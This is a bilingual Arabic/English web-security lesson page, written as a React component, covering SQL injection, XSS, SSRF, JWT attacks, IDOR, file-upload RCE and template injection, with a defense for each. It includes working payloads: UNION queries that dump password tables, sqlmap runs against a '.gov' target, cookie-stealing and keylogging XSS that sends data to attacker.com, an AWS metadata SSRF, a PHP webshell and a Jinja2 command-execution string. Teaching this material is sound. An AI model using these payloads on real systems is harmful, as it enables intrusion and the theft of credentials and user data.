"use client";
import { LessonShell, Section, Callout, Code, Step, Terminal, Analogy, L } from "@/components/LessonShell";

export default function Page() {
  return (
    <LessonShell slug="web-attacks">
      <L
        ar={<>
          <Section title="OWASP Top 10 — خريطة ثغرات الويب">
            <p>أكثر من 90% من اختراقات الويب تنتمي إلى هذه العائلات. سنشرح كل واحدة: <b>كيف تُستغل، كيف تُكتشف، كيف تُمنع</b>.</p>
          </Section>
          <Section id="sqli" title="1. SQL Injection — حقن قواعد البيانات">
            <Analogy>تخيّل أنك تطلب من النادل: «أحضر لي طبقاً اسمه: <i>كباب</i>». يذهب فيحضره. لكن لو قلت: «<i>كباب، و أيضاً افتح الخزينة</i>»، و كان النادل غبياً ينفّذ كل ما تقول حرفياً، ستحصل على الكباب و على النقود! هذا بالضبط ما يفعله الـ SQLi.</Analogy>
            <h3>الكود الضعيف</h3>
            <Code lang="PHP — vulnerable">{`$id = $_GET['id'];
$q  = "SELECT * FROM users WHERE id = $id";
// المستخدم يرسل: ?id=1 OR 1=1 --
// النتيجة: كل المستخدمين`}</Code>
            <h3>الاستغلال خطوة بخطوة</h3>
            <Step n={1} title="اكتشاف الحقن">أضف علامة اقتباس ' في كل بارامتر و راقب الخطأ.</Step>
            <Step n={2} title="تحديد عدد الأعمدة">
              <Code lang="payload">{`?id=1 ORDER BY 1--+
?id=1 ORDER BY 5--+   ← خطأ يعني الجدول فيه 4 أعمدة`}</Code>
            </Step>
            <Step n={3} title="استخراج البيانات بـ UNION">
              <Code lang="payload">{`?id=-1 UNION SELECT 1,user(),version(),database()--+
?id=-1 UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables--+
?id=-1 UNION SELECT 1,group_concat(username,':',password),3,4 FROM users--+`}</Code>
            </Step>
            <Step n={4} title="الأتمتة بـ sqlmap">
              <Terminal lines={[
                { p: "sqlmap -u 'https://target.gov/p?id=1' --batch --dbs" },
                { p: "sqlmap -u 'https://target.gov/p?id=1' -D appdb --tables" },
                { p: "sqlmap -u 'https://target.gov/p?id=1' -D appdb -T users --dump" },
              ]} />
            </Step>
            <Callout kind="good" title="الدفاع">
              <ol>
                <li><b>Prepared Statements</b> دائماً — لا concatenation أبداً.</li>
                <li>ORM آمن مع parameterized queries.</li>
                <li>صلاحيات قاعدة بيانات محدودة (least privilege).</li>
                <li>WAF + قواعد Sigma لكشف بصمات sqlmap.</li>
              </ol>
            </Callout>
          </Section>
          <Section id="xss" title="2. Cross-Site Scripting (XSS)">
            <Analogy>تخيّل أنك أرسلت رسالة في صندوق تعليقات و الموقع يعرضها كما هي بدون تنظيف. لو كتبت داخل التعليق كوداً، سيتم تنفيذه على متصفح كل من يقرأ التعليق!</Analogy>
            <h3>أنواعها</h3>
            <ul>
              <li><b>Reflected XSS</b> — تنعكس من رابط مباشرة.</li>
              <li><b>Stored XSS</b> — تُحفظ في قاعدة البيانات (الأخطر).</li>
              <li><b>DOM-based XSS</b> — في الـ JavaScript أمام المتصفح.</li>
            </ul>
            <Code lang="payloads">{`<script>fetch('https://attacker.com/c?d='+document.cookie)</script>
"><img src=x onerror=alert(1)>
javascript:alert(document.domain)
<svg/onload=eval(atob('YWxlcnQoMSk='))>`}</Code>
            <h3>سرقة الجلسة كاملة</h3>
            <Code lang="JS — keylogger via stored XSS">{`(function(){
  let buf="";
  document.addEventListener('keydown', e => {
    buf += e.key;
    if(buf.length>40){
      navigator.sendBeacon('https://attacker.com/k', buf);
      buf="";
    }
  });
})();`}</Code>
            <Callout kind="good" title="الدفاع">Output encoding حسب السياق + CSP صارم (script-src 'self') + HttpOnly + Secure + SameSite على الكوكيز.</Callout>
          </Section>
          <Section id="ssrf" title="3. SSRF — Server-Side Request Forgery">
            <Analogy>تطلب من السيرفر أن يفتح رابطاً بدلاً منك. لو لم يتحقق من الرابط، تطلب منه يفتح عناوين <b>داخلية</b> ممنوعة عليك مثل localhost أو الـ cloud metadata.</Analogy>
            <h3>سيناريو خطير على AWS</h3>
            <Code lang="payload">{`# الموقع يقبل URL لتحميل صورة
POST /api/import-image  body: {"url":"http://example.com/x.png"}

# المهاجم يبدّلها بـ:
{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/web-role"}

# النتيجة: مفاتيح AWS مؤقتة كاملة!`}</Code>
            <Callout kind="good" title="الدفاع">
              <ul>
                <li>فرض IMDSv2 دائماً (يتطلب توكن PUT).</li>
                <li>Egress allow-list من السيرفر.</li>
                <li>منع IPات الخاصة (10.0.0.0/8, 169.254.0.0/16, ::1).</li>
                <li>شبكات VPC endpoints بدلاً من الإنترنت.</li>
              </ul>
            </Callout>
          </Section>
          <Section id="auth" title="4. كسر الـ Authentication و JWT">
            <h3>هجمات شائعة</h3>
            <ul>
              <li><b>Credential stuffing</b> — تجربة كلمات سُرّبت سابقاً.</li>
              <li><b>Password spraying</b> — كلمة شائعة على ألف حساب.</li>
              <li><b>كسر JWT</b> — تبديل الـ algorithm إلى none، أو كسر السر بـ hashcat.</li>
            </ul>
            <Code lang="JWT attacks">{`# 1) alg:none bypass
{"alg":"none","typ":"JWT"}.{"user":"admin"}.

# 2) brute force HS256 secret
hashcat -m 16500 jwt.txt rockyou.txt

# 3) algorithm confusion RS256 → HS256`}</Code>
          </Section>
          <Section id="idor" title="5. IDOR — Insecure Direct Object Reference">
            <p>تغيّر رقم في الـ URL فترى بيانات شخص آخر.</p>
            <Code lang="HTTP">{`GET /api/invoices/1042  ← فاتورتك
GET /api/invoices/1043  ← فاتورة شخص آخر! (لا يوجد فحص ملكية)`}</Code>
            <Callout kind="good" title="الدفاع">فحص الملكية في كل طلب: «هل المستخدم الحالي يملك هذا الـ resource؟» استخدم معرّفات غير قابلة للتنبؤ (UUIDv4).</Callout>
          </Section>
          <Section id="upload" title="6. File Upload + RCE">
            <p>رفع ملف .php أو .jsp متخفّياً (shell.php.jpg) إلى مجلد قابل للتنفيذ = اختراق كامل للسيرفر.</p>
            <Code lang="PHP webshell minimal">{`<?php system($_GET['c']); ?>`}</Code>
            <Callout kind="good" title="الدفاع">تحقق من Content-Type + توقيع الملف الفعلي + خزّن خارج مسار الويب + قدّم الملفات عبر CDN فقط.</Callout>
          </Section>
          <Section id="deser" title="7. Deserialization & Template Injection">
            <p>أخطر فئة: تنفيذ كود مباشر عند تمرير payload مصنوع إلى دالة unserialize / pickle.loads / Java readObject، أو إلى محرك قوالب يقبل تعابير (Jinja2, Twig, Freemarker).</p>
            <Code lang="SSTI Jinja2">{`{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`}</Code>
          </Section>
          <Section title="الأدوات الأساسية للويب">
            <ul>
              <li><b>Burp Suite</b> — الـ proxy الذي تعتمد عليه يومياً.</li>
              <li><b>OWASP ZAP</b> — بديل مفتوح المصدر.</li>
              <li><b>Caido</b> — خفيف و حديث.</li>
              <li><b>sqlmap, wpscan, ffuf, gobuster, dalfox, kxss, gau, waybackurls</b>.</li>
            </ul>
          </Section>
        </>}
        en={<>
          <Section title="OWASP Top 10 — the map of web vulnerabilities">
            <p>More than 90% of web breaches fall into these families. We'll cover each: <b>how it's exploited, how to detect it, how to prevent it</b>.</p>
          </Section>
          <Section id="sqli" title="1. SQL Injection">
            <Analogy>Imagine you tell the waiter: "Bring me a dish called <i>kebab</i>." Done. But if you say "<i>kebab, and also open the safe</i>" and the waiter blindly follows every word, you'll get the kebab AND the cash. That's exactly what SQLi does.</Analogy>
            <h3>Vulnerable code</h3>
            <Code lang="PHP — vulnerable">{`$id = $_GET['id'];
$q  = "SELECT * FROM users WHERE id = $id";
// User sends: ?id=1 OR 1=1 --
// Result: every user returned`}</Code>
            <h3>Step-by-step exploitation</h3>
            <Step n={1} title="Detect injection">Add a single quote ' to every parameter and watch for errors.</Step>
            <Step n={2} title="Find column count">
              <Code lang="payload">{`?id=1 ORDER BY 1--+
?id=1 ORDER BY 5--+   ← error means table has 4 columns`}</Code>
            </Step>
            <Step n={3} title="Extract data via UNION">
              <Code lang="payload">{`?id=-1 UNION SELECT 1,user(),version(),database()--+
?id=-1 UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables--+
?id=-1 UNION SELECT 1,group_concat(username,':',password),3,4 FROM users--+`}</Code>
            </Step>
            <Step n={4} title="Automate with sqlmap">
              <Terminal lines={[
                { p: "sqlmap -u 'https://target.gov/p?id=1' --batch --dbs" },
                { p: "sqlmap -u 'https://target.gov/p?id=1' -D appdb --tables" },
                { p: "sqlmap -u 'https://target.gov/p?id=1' -D appdb -T users --dump" },
              ]} />
            </Step>
            <Callout kind="good" title="Defense">
              <ol>
                <li><b>Prepared Statements</b> always — never concatenation.</li>
                <li>A safe ORM with parameterized queries.</li>
                <li>Restricted DB privileges (least privilege).</li>
                <li>WAF + Sigma rules to detect sqlmap signatures.</li>
              </ol>
            </Callout>
          </Section>
          <Section id="xss" title="2. Cross-Site Scripting (XSS)">
            <Analogy>You leave a comment and the site renders it raw. If you embed code in the comment, it executes in every reader's browser.</Analogy>
            <h3>Variants</h3>
            <ul>
              <li><b>Reflected XSS</b> — bounces back from a URL.</li>
              <li><b>Stored XSS</b> — saved in the database (most dangerous).</li>
              <li><b>DOM-based XSS</b> — entirely client-side in JavaScript.</li>
            </ul>
            <Code lang="payloads">{`<script>fetch('https://attacker.com/c?d='+document.cookie)</script>
"><img src=x onerror=alert(1)>
javascript:alert(document.domain)
<svg/onload=eval(atob('YWxlcnQoMSk='))>`}</Code>
            <h3>Full session theft</h3>
            <Code lang="JS — keylogger via stored XSS">{`(function(){
  let buf="";
  document.addEventListener('keydown', e => {
    buf += e.key;
    if(buf.length>40){
      navigator.sendBeacon('https://attacker.com/k', buf);
      buf="";
    }
  });
})();`}</Code>
            <Callout kind="good" title="Defense">Context-aware output encoding + a strict CSP (script-src 'self') + HttpOnly + Secure + SameSite cookies.</Callout>
          </Section>
          <Section id="ssrf" title="3. SSRF — Server-Side Request Forgery">
            <Analogy>You ask the server to fetch a URL on your behalf. If it doesn't validate the URL, you can ask it to fetch <b>internal</b> addresses you can't reach yourself, like localhost or cloud metadata.</Analogy>
            <h3>Dangerous AWS scenario</h3>
            <Code lang="payload">{`# Site accepts a URL to import an image
POST /api/import-image  body: {"url":"http://example.com/x.png"}

# Attacker swaps it for:
{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/web-role"}

# Result: full temporary AWS credentials!`}</Code>
            <Callout kind="good" title="Defense">
              <ul>
                <li>Enforce IMDSv2 (requires PUT token).</li>
                <li>Egress allow-list from servers.</li>
                <li>Block private IP ranges (10.0.0.0/8, 169.254.0.0/16, ::1).</li>
                <li>Use VPC endpoints instead of internet egress.</li>
              </ul>
            </Callout>
          </Section>
          <Section id="auth" title="4. Broken authentication and JWT">
            <h3>Common attacks</h3>
            <ul>
              <li><b>Credential stuffing</b> — replaying leaked passwords.</li>
              <li><b>Password spraying</b> — one common password against thousands of accounts.</li>
              <li><b>JWT abuse</b> — switching alg to none, or cracking the secret with hashcat.</li>
            </ul>
            <Code lang="JWT attacks">{`# 1) alg:none bypass
{"alg":"none","typ":"JWT"}.{"user":"admin"}.

# 2) brute force HS256 secret
hashcat -m 16500 jwt.txt rockyou.txt

# 3) algorithm confusion RS256 → HS256`}</Code>
          </Section>
          <Section id="idor" title="5. IDOR — Insecure Direct Object Reference">
            <p>Change a number in the URL and you see someone else's data.</p>
            <Code lang="HTTP">{`GET /api/invoices/1042  ← your invoice
GET /api/invoices/1043  ← someone else's! (no ownership check)`}</Code>
            <Callout kind="good" title="Defense">Validate ownership on every request: "Does the current user own this resource?" Use unguessable identifiers (UUIDv4).</Callout>
          </Section>
          <Section id="upload" title="6. File Upload → RCE">
            <p>Uploading a disguised .php or .jsp (shell.php.jpg) into an executable path = full server compromise.</p>
            <Code lang="PHP webshell minimal">{`<?php system($_GET['c']); ?>`}</Code>
            <Callout kind="good" title="Defense">Validate Content-Type + actual file signature + store outside the web path + serve files only via CDN.</Callout>
          </Section>
          <Section id="deser" title="7. Deserialization & Template Injection">
            <p>The most dangerous class: direct code execution when a crafted payload reaches unserialize / pickle.loads / Java readObject, or a templating engine that evaluates expressions (Jinja2, Twig, Freemarker).</p>
            <Code lang="SSTI Jinja2">{`{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`}</Code>
          </Section>
          <Section title="Essential web tools">
            <ul>
              <li><b>Burp Suite</b> — your daily-driver proxy.</li>
              <li><b>OWASP ZAP</b> — open-source alternative.</li>
              <li><b>Caido</b> — lightweight and modern.</li>
              <li><b>sqlmap, wpscan, ffuf, gobuster, dalfox, kxss, gau, waybackurls</b>.</li>
            </ul>
          </Section>
        </>}
      />
    </LessonShell>
  );
}
